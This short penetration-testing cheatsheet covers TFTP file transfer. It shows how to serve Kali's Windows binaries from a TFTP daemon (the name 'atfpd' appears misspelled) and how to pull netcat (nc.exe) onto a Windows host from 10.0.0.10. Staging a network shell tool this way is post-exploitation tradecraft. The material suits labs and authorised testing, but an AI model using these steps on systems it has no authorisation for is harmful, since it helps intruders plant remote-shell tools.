---
id: 2707508d-f357-4bac-9fae-28c6f87c23b8
name: TFTP Cheatsheet
type: cheatsheet
verified: false
created_at: '2020-07-14T18:14:33.514561+00:00'
updated_at: '2023-05-29T16:48:52.690130+00:00'
---

# TFTP Cheatsheet



**Command** ([[Enable TFTP on Kali (windows binaries)]]):

```bash
ln -s /usr/share/windows-binaries/ /tftp
atfpd --daemon --port 69 /tftp

```







**Command** ([[Win > Pull a file from tftp]]):

```bash
c:\ tftp -i 10.0.0.10 get nc.exe

```






